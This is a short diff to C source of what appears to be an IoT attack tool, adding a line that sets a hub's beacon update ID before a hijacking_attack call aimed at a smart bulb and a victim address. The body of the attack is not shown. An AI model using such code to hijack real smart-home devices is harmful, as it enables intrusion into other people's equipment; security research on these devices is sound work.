@@ -84,6 +84,7 @@ int main(void)
 		else if (attack_no == 3)
 		{
 			bulb_addr.beacon_update_id = 0x08;
+			hub_addr.beacon_update_id = 0x08;
 			hijacking_attack(&bulb_addr, &victim_addr, 0x30000000);
 			attack_no = 0xff;
 		}
